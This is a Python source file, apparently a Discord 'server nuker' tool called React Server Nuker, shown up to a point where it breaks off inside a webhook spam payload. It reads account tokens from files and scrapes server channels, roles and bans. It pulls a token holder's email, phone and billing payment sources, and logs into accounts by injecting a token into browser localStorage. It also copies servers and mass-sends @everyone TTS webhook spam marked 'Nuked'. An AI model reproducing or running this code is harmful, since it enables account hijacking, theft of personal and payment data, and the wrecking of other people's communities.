try:
    import discum
    import requests
    import json
    import pathlib 
    import time
    import websocket
    import base64
    import random
    import os
    import socket
    import sys
    import pypresence
    import threading
    import hashlib
    import base64
    import string
    import datetime
    import subprocess
    import ctypes
    import colorama
    
    from colorama import Fore , Style
    from selenium import webdriver
    from concurrent.futures import ThreadPoolExecutor

except ImportError:
    print("Import error ; pip install -r requirements.txt")

colorama.init(autoreset=True)
lock = threading.Lock()

class Colour:

    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE  
    RED = Fore.RED
    GREEN = Fore.GREEN
    MAGENTA = Fore.MAGENTA
    LIGHTBLUE = Fore.LIGHTBLUE_EX
    BRIGHT = Style.BRIGHT

class URL:
    IconURL = "https://avatars.githubusercontent.com/u/70201574?v=4"
    Github = "https://github.com/reactxsw"
    Repository = "https://github.com/reactxsw/react-nuker/blob/main/main.py"
    RAW_main_py = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/main.py"
    RAW_config_json = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/config.json"

    CdnURL = "https://cdn.discordapp.com/"
    Canary = "https://canary.discordapp.com/api/v9/"
    DiscordWebsocket = "wss://gateway.discord.gg/?v=9&encoding=json"
    WebhookBase = "https://discord.com/api/webhooks/"
    BaseURL = "https://discord.com/api/v9/"
    WebhookURL = "https://discord.com/api/webhooks/"

class Constant:
    CheckForUpdate = False
    RPC = False
    Space= " "*19
    Blank = "_"*37
    if pathlib.Path("config.json").exists():
        START = True
        with open('config.json') as setting:
            config = json.load(setting)
        
        SERVER_ID = config.get("SERVER_ID")
        TOKEN = config.get("TOKEN")
        INVITE_CODE = config.get("INVITE_CODE")

        if SERVER_ID == Blank:
            SERVER_ID = False
        
        if TOKEN == Blank:
            TOKEN = False
        
        if INVITE_CODE == Blank:
            INVITE_CODE = False
        
    else:
        START=False
        with open("config.json", "w") as setting:
            setting.writelines(
                [
                    "{",
                        "\n"
                        "    "+f'"SERVER_ID": "{Blank}",',
                        "\n",
                        "    "+f'"TOKEN": "{Blank}",',
                        "\n",
                        "    "+f'"INVITE_CODE": "{Blank}"',
                        "\n",
                    "}"
                ]
            )
    
    VOICE_ID = "873904278346010734"
    CLIENT_ID = "794921074768216126"
    LARGE_IMAGE = "smilewinlogo"
    IP_ADDR = socket.gethostbyname(socket.gethostname())


    if pathlib.Path("tokens.txt").exists():
        with open("tokens.txt") as f:
            TOKENS = [x.strip() for x in f.readlines()] 
    else:
        file = open("tokens.txt", "w") 

class RandomInfo():
    def username():
        return "".join(random.choice(string.ascii_letters +string.digits) for x in range(random.randint(8, 12)))

class Update:

    def CheckUpdate(Check):
        if Check is True:

            with open(__file__, "r", encoding="utf8") as f:
                file = f.read()

            urlcode = requests.get(URL.RAW_main_py).text
            urlhash = hashlib.sha256((urlcode).encode('utf-8')).hexdigest()

            if hashlib.sha256((file).encode('utf-8')).hexdigest() != urlhash:
                print(f"{Constant.Space}There is an update availble. Do you want to Update ? ")
                return "UPDATE" ,input(f"{Constant.Space}[ Y / N ] ")

            else:
                return "UPTODATE", "NULL"
        
        else:
            pass

    def UpdateProgram(self):
        print("ajajaj")


class Infomation:

    def __init__(self):
        self.Author = "REACT#1120"
        self.__VERSION__ = "2.0.0"
        self.Github = URL.Github
        self.Repository = URL.Repository

    def Credit(self):
        print(self.Author)

class Status:

    SuccessStatus = [200,201,204]
    RatelimitStatus = [429,401]

    def Fail(Text):
        lock.acquire()
        print(f"{Constant.Space}{Colour.BRIGHT}{Colour.RED}[{Colour.WHITE}FAIL{Colour.RED}] {Text}")
        lock.release()

    def Success(Text):
        lock.acquire()
        print(f"{Constant.Space}{Colour.BRIGHT}{Colour.GREEN}[{Colour.WHITE}SUCCESS{Colour.GREEN}] {Text}")
        lock.release()
    
    def Ratelimit(Text):
        lock.acquire()
        print(f"{Constant.Space}{Colour.BRIGHT}{Colour.MAGENTA}[{Colour.WHITE}RATELIMIT{Colour.MAGENTA}] {Text}")
        lock.release()

class Function:

    def SendHeartBeatInterval(Interval, Websocket):
        while True:
            time.sleep(Interval/1000)
            try:
                Websocket.send(json.dumps({
                    "op":1,
                    "d":None}))

            except Exception:
                break

    def ConvertImgToBase64(Image):
        with open(Image, "rb") as img_file:
            Base64img = base64.b64encode(img_file.read()).decode()

        return (f"data:image/jpeg;base64,{Base64img}")

    def Credit():
        print(Infomation().Author)
        print(Infomation().__VERSION__)
        print(Infomation().Github) 

    def DiscordRPC():
        if Constant.RPC is True:
            RPC = pypresence.Presence(Constant.CLIENT_ID)  
            RPC.connect() 
            RPC.update(state="Hacking",details="Smilewin discord server", join="https discord.gg/3UJFaRvJRC" ,large_image=Constant.LARGE_IMAGE,start=time.time())
        
        else:
            pass
        
    def CheckInternet():
        try:
            host = socket.gethostbyname("1.1.1.1")
            sk = socket.create_connection((host, 80), 2)
            sk.close()
            return True 
        except:
            pass
        return False
    
    def Clear():
        subprocess.call("cls" if os.name == "nt" else "clear",shell=True)
    
    def Spinner():
        l = ['|', '/', '-', '\\']
        for i in l*3:
            sys.stdout.write('\r'f"{Colour.BRIGHT}{Colour.YELLOW}Loading... {i}")
            sys.stdout.flush()
            time.sleep(0.075)

    def Menu():
        i = 1
        
        print(f"""{Colour.LIGHTBLUE}                
                                        ██▀███  ▓█████ ▄▄▄       ▄████▄  ▄▄▄█████▓    {Colour.WHITE}B{Colour.LIGHTBLUE}
                                        ▓██ ▒ ██▒▓█   ▀▒████▄    ▒██▀ ▀█  ▓  ██▒ ▓▒   {Colour.WHITE}Y{Colour.LIGHTBLUE}
                                        ▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▒▓█    ▄ ▒ ▓██░ ▒░  
                                        ▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▒▓▓▄ ▄██▒░ ▓██▓ ░    {Colour.WHITE}R{Colour.LIGHTBLUE}
                                        ░██▓ ▒██▒░▒████▒▓█   ▓██▒▒ ▓███▀ ░  ▒██▒ ░    {Colour.WHITE}E{Colour.LIGHTBLUE}
                                        ░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░░ ░▒ ▒  ░  ▒ ░░      {Colour.WHITE}A{Colour.LIGHTBLUE}
                                        ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░  ░  ▒       ░         {Colour.WHITE}C{Colour.LIGHTBLUE}
                                        V.{Infomation().__VERSION__}                                       {Colour.WHITE}T{Colour.LIGHTBLUE}""")
        print(f"{Colour.YELLOW}{Constant.Space}╔═════════════════════╦═════════════════════╦═════════════════════╦═════════════════════╗")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}1{Colour.CYAN}] {Main.FunctionDict[1][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[1][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}12{Colour.CYAN}]{Main.FunctionDict[12][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[12][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}23{Colour.CYAN}]{Main.FunctionDict[23][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[23][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}34{Colour.CYAN}]{Main.FunctionDict[34][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[34][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}2{Colour.CYAN}] {Main.FunctionDict[2][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[2][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}13{Colour.CYAN}]{Main.FunctionDict[13][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[13][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}24{Colour.CYAN}]{Main.FunctionDict[24][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[24][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}35{Colour.CYAN}]{Main.FunctionDict[35][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[35][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}3{Colour.CYAN}] {Main.FunctionDict[3][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[3][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}14{Colour.CYAN}]{Main.FunctionDict[14][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[14][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}25{Colour.CYAN}]{Main.FunctionDict[25][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[25][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}36{Colour.CYAN}]{Main.FunctionDict[36][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[36][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}4{Colour.CYAN}] {Main.FunctionDict[4][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[4][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}15{Colour.CYAN}]{Main.FunctionDict[15][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[15][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}26{Colour.CYAN}]{Main.FunctionDict[26][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[26][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}37{Colour.CYAN}]{Main.FunctionDict[37][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[37][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}5{Colour.CYAN}] {Main.FunctionDict[5][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[5][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}16{Colour.CYAN}]{Main.FunctionDict[16][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[16][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}27{Colour.CYAN}]{Main.FunctionDict[27][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[27][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}38{Colour.CYAN}]{Main.FunctionDict[38][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[38][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}6{Colour.CYAN}] {Main.FunctionDict[6][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[6][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}17{Colour.CYAN}]{Main.FunctionDict[17][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[17][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}28{Colour.CYAN}]{Main.FunctionDict[28][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[28][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}39{Colour.CYAN}]{Main.FunctionDict[39][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[39][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}7{Colour.CYAN}] {Main.FunctionDict[7][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[7][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}18{Colour.CYAN}]{Main.FunctionDict[18][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[18][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}29{Colour.CYAN}]{Main.FunctionDict[29][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[29][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}40{Colour.CYAN}]{Main.FunctionDict[40][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[40][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}8{Colour.CYAN}] {Main.FunctionDict[8][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[8][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}19{Colour.CYAN}]{Main.FunctionDict[19][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[19][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}30{Colour.CYAN}]{Main.FunctionDict[30][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[30][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}41{Colour.CYAN}]{Main.FunctionDict[41][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[41][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}9{Colour.CYAN}] {Main.FunctionDict[9][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[9][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}20{Colour.CYAN}]{Main.FunctionDict[20][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[20][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}31{Colour.CYAN}]{Main.FunctionDict[31][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[31][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}42{Colour.CYAN}]{Main.FunctionDict[42][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[42][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}10{Colour.CYAN}]{Main.FunctionDict[10][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[10][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}21{Colour.CYAN}]{Main.FunctionDict[21][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[21][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}32{Colour.CYAN}]{Main.FunctionDict[32][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[32][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}43{Colour.CYAN}]{Main.FunctionDict[43][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[43][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}11{Colour.CYAN}]{Main.FunctionDict[11][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[11][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}22{Colour.CYAN}]{Main.FunctionDict[22][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[22][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}33{Colour.CYAN}]{Main.FunctionDict[33][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[33][1])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}44{Colour.CYAN}]{Colour.RED}{Main.FunctionDict[44][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[44][1])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}╚═════════════════════╩═════════════════════╩═════════════════════╩═════════════════════╝")

class ReqHeader:

    def UserAgent():
        
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.31"
            ])

    def DiscordHeader():
        UA = ReqHeader.UserAgent()
        if requests.get(f"{URL.BaseURL}users/@me", headers={"Authorization": Constant.TOKEN}).status_code == 200:
            return {
                "authorization": f"{Constant.TOKEN}",
                "user-agent": f"{UA}",
                }
        return {
            "Authorization": f"Bot {Constant.TOKEN}"
            }

class Data:
    def GetUserInfoServer():
        response = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members/394447088970104833",headers=ReqHeader.DiscordHeader())
        print(response.json())
        
    def GetTokenInfo():
        if Constant.TOKEN is not False:
            CC_Digits = {
                'american express': '3',
                'visa': '4',
                'mastercard': '5'
            }
            response  = requests.get(f"{URL.BaseURL}users/@me",headers= ReqHeader.DiscordHeader())
            print(response.json())
            if response.status_code in Status.SuccessStatus:
                Userid = response.json()["id"]
                Username = f'{response.json()["username"]}#{response.json()["discriminator"]}'
                Email = response.json()["email"]
                Phone = response.json()["phone"]
                Language = response.json()["locale"]
                AvatarURL = f'{URL.CdnURL}avatars/{Userid}/{response.json()["avatar"]}.webp'
                subscription = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=ReqHeader.DiscordHeader()).json()
                nitro = bool(len(subscription) > 0)
                if nitro:
                    NitroEnd = datetime.strptime(subscription[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    NitroStart = datetime.strptime(subscription[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    NitroLeft = abs((NitroStart - NitroEnd).days)
                Billing = requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=ReqHeader.DiscordHeader()).json()
                print(Billing)
                print(f"{Constant.Space}")
        
        else:
            print("")

    def GetBanMember_ID():
        if Constant.TOKEN is not False:
            ban_id = []
            bans = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/bans", headers = ReqHeader.DiscordHeader())
            if bans.status_code in Status.SuccessStatus:
                for i , items in enumerate(bans.json()):
                    ban_id.append(items["user"]["id"])
                return ban_id
            
            elif bans.status_code in Status.Ratelimit:
                Status.Ratelimit("Ratelimit")
            
            else:
                Status.Fail("Unable to scrape Ban Members ID")

            return []

    def GetChannel_ID():
        if Constant.TOKEN is not False:
            channel_id = [] 
            channels = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers= ReqHeader.DiscordHeader())
            if channels.status_code in Status.SuccessStatus:    
                for i , items in enumerate(channels.json()):
                    channel_id.append(items["id"])

                Status.Success("Scraped Channels ID")
                return channel_id
            
            elif channels.status_code in Status.RatelimitStatus:
                Status.Ratelimit("Ratelimit")
            
            else:
                Status.Fail("Unable to scrape Channels ID")
            
            return []

    
    def GetTextChannel_ID():
        if Constant.TOKEN is not False:
            text_channel_id = [] 
            response = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}",headers=ReqHeader.DiscordHeader()).json()
            channels = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers= ReqHeader.DiscordHeader())
            if "COMMUNITY" in response["features"]:
                Mod_channel = response["public_updates_channel_id"]

            if channels.status_code in Status.SuccessStatus:    
                for i , items in enumerate(channels.json()):
                    if items["type"] == 0 and items["id"] != Mod_channel:
                        text_channel_id.append(items["id"])

                return text_channel_id

            elif channels.status_code in Status.RatelimitStatus:
                Status.Ratelimit("Ratelimit")
            
            else:
                Status.Fail("Unable to scrape Text Channels ID")

            return []

    def GetRole_ID():
        if Constant.TOKEN is not False:
            role_id = []
            roles = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers= ReqHeader.DiscordHeader())
            if roles.status_code in Status.SuccessStatus:
                for i , items in enumerate(roles.json()):
                    role_id.append(items["id"])
                
                Status.Success("Scraped Role ID")
                return role_id
            
            elif roles.status_code in Status.Ratelimit:
                Status.Ratelimit("Ratelimit")
            
            else:
                Status.Fail("Unable to scrape Roles ID")
            
            return []
    
    def GetEmoji_ID():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            emoji_id = []
            emojis = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/emojis", headers=ReqHeader.DiscordHeader())
            if emojis.status_code in Status.SuccessStatus:
                for i , items in enumerate(emojis.json()):
                    emoji_id.append(items["id"])
                
                Status.Success("Scraped Emoji ID")
                return emoji_id

            
            elif emojis.status_code in Status.RatelimitStatus:
                Status.Ratelimit("Ratelimit")

            else:
                Status.Fail("Unable to scrape Emoji ID") 

            return []

    def GetMessage_ID(Channel):
        if Constant.TOKEN is not False:
            message_id = []
            messages = requests.get(f"{URL.BaseURL}channels/{Channel}/messages?limit=50")
            if messages.status_code in Status.SuccessStatus:
                for i , items in enumerate(messages.json()):
                    message_id.append(items["id"])  

                Status.Success("Scraped Message ID")
                return message_id

            elif messages.status_code in Status.RatelimitStatus:
                Status.Ratelimit("Ratelimit")
            
            else:
                Status.Fail("Unable to scrape Message ID")

            return []

class Discord:

    def PinMessage(Channel , Message):
        response = requests.put(f"{URL.BaseURL}channels/{Channel}/pins/{Message}", headers=ReqHeader.DiscordHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"{Message} in {Channel} Pinned")
        
        elif response.status_code in Status.RatelimitStatus:
            Status.Ratelimit("Ratelimit")
        
        else:
            Status.Fail(f"Unable to pin {Message} in {Channel}")

    def CreateDiscordBot():
        response = requests.post(f"{URL.BaseURL}applications", json={"name":"React","team_id":None}, headers=ReqHeader.DiscordHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created application {response.json()['id']}")
            bot = requests.post(f"{URL.BaseURL}applications/{response.json()['id']}/bot")

        else:
            Status.Fail(f"Failed to create application")


    def DiscordTokenLogin():
        response= requests.get(f"{URL.Canary}users/@me", headers=ReqHeader.DiscordHeader())
        if response.status_code in Status.SuccessStatus:
            response  = requests.get(f"{URL.BaseURL}users/@me",headers= ReqHeader.DiscordHeader()).json()
            options = webdriver.ChromeOptions()
            options.add_experimental_option('excludeSwitches', ['enable-logging'])
            driver = webdriver.Chrome("chromedriver.exe",options=options)
            driver.get("https://discord.com/login")
            script = """
                    function login(token) {
                        setInterval(() => {
                        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                        }, 50);
                        setTimeout(() => {
                        location.reload();
                        }, 2500);
                    }

                    login(token);
            """
            driver.execute_script(f'let token = "{Constant.TOKEN}";\n'+script)

            Status.Success(f"Login to {response['username']}#{response['discriminator']}")
        
        else:
            print(f"{Constant.Space}{Colour.YELLOW}")

    def CopyServer():
        if Constant.TOKEN is not False:
            template = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/templates", headers=ReqHeader.DiscordHeader()).json()
            if len(template) > 0:
                requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/templates/{template[0]['code']}",headers=ReqHeader.DiscordHeader())

            response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/templates", headers=ReqHeader.DiscordHeader(),json={
                "description":"",
                "name":"React"
            }).json() 
            guild = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}", headers=ReqHeader.DiscordHeader()).json()
            guild_icon = base64.b64encode(requests.get(f'{URL.CdnURL}icons/{guild["id"]}/{guild["icon"]}.webp?size=1024').content).decode()    
            bs64_guild_icon = (f"data:image/jpeg;base64,{guild_icon}")
            create = requests.post(f"{URL.BaseURL}guilds/templates/{response['code']}",headers=ReqHeader.DiscordHeader(),json={
                "icon":bs64_guild_icon,
                "name":guild["name"]
            })
            if create.status_code in Status.SuccessStatus:
                Status.Success("Server Copied")

        else:
            print(f"{Constant.Space}no token ~")

    def CreateServer(ServerName):
        response= requests.post(f"{URL.BaseURL}guilds", headers=ReqHeader.DiscordHeader(), json={
            "name": f"{ServerName}"
            })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Server named {ServerName}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"You are being rate limited")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateServer, args=(ServerName)).start()

        else:
            Status.Fail("Unable to Create new Server")

    def ChangeServerImage():
        Image = [] 
        Extension = [".jpg",".png"]
        for i in os.listdir(pathlib.Path().absolute()):
            if (os.path.splitext(i)[1]).lower() in Extension:
                Image.append(i)

        if len(Image) != 0:
            for i , items in enumerate(Image):
                print(f"{Constant.Space}{Colour.WHITE}[{Colour.CYAN}{i+1}{Colour.WHITE}]. {items}")
            
            base64img = Function.ConvertImgToBase64(Image[int(input(f"{Constant.Space}"))-1])
            response = requests.patch(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}",
                json= {
                    "icon":base64img
                    },
                    headers=ReqHeader.DiscordHeader())
            print(response.text)
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Changed")
                
        else:
            print(f"{Constant.Space}No picture")

    def ChangeServerName():
        Name = input(f"{Constant.Space}")
        response = requests.patch(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}", headers=ReqHeader.DiscordHeader(),
        json={
            "name":Name
        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Server name changed to {Name}")

        else:
            Status.Fail("Unable to change server name")

    def ChangeStatus():

        Text = input(f"{Constant.Space}{Colour.YELLOW}Status : {Colour.WHITE}")
        Dynamic = input(f"{Constant.Space}{Colour.YELLOW}Moving Status [Y/N] : {Colour.WHITE}")
        if Dynamic.upper() in ["Y","YES"]:
            Stat = [""]
            for i , items in enumerate(Text):
                Stat.append(Stat[i]+items)
            del Stat[0]

            while True:
                for i , item in enumerate(Stat):
                    response = requests.patch(f"{URL.BaseURL}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                        "custom_status": {
                            "text": item}
                            })
                    if response.status_code in Status.SuccessStatus:
                        Status.Success(f"Status changed to {item}")

                    elif response.status_code == 429:
                        Status.Ratelimit("Ratelimit")
                    
                    else:
                        Status.Fail(f"Unable to change status to {item}")
        else:
            response = requests.patch(f"{URL.BaseURL}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                        "custom_status": {
                            "text": Text}
                            })
            
            if response.status_code in Status.SuccessStatus:
                        Status.Success(f"Status changed to {Text}")

            elif response.status_code == 429:
                Status.Ratelimit("Ratelimit")
            
            else:
                Status.Fail(f"Unable to change status to {Text}")

    def SendWebhook(Webhook_URL, Message):
        try:
            response =  requests.post(Webhook_URL, headers={
                "content-type": "application/json"
                },
                json={
                    "username":"React",
                    "avatar_url": URL.IconURL,
                    "content": "@everyone",
                    "tts": True,
                    "embeds": [
                        {
                        "title": "React Server Nuker",
                        "description": f"@everyone\n\n> {Message}",
                        "color": random.randint(0, 16777215),
                        "author": {
                                "name": "React Server Nuker",
                                "url": "https://smilewindiscord-th.web.app/joindiscord.html",
                                "icon_url": URL.IconURL
                            },
                            "footer": {
                                "text": "Nuked ~",
                                "icon_url": URL.IconURL
                            },
                            "timestamp": f"{str(datetime.datetime.utcnow())}",
                            "image": {
                                "url": URL.IconURL
                            },
                            "thumbnail": {
                                "url": URL.IconURL
                            }
                        },
                        {
                        "title": "React Server Nuker",
                        "description": f"@everyone\n\n> {Message}",
                        "color": random.randint(0, 16777215),
                        "author": {
                                "name": "React Server Nuker",
                                "url": "https://smilewindiscord-th.web.app/joindiscord.html",
                                "icon_url": URL.IconURL
                            },
                            "footer": {
                                "text": "Nuked ~",
                                "icon_url": URL.IconURL
                            },
                            "timestamp": f"{str(datetime.datetime.utcnow())}",
                            "image": {
                                "url": URL.IconURL
                            },
                            "thumbnail": {
                                "url": URL.IconURL
                            }
                        },
                        {
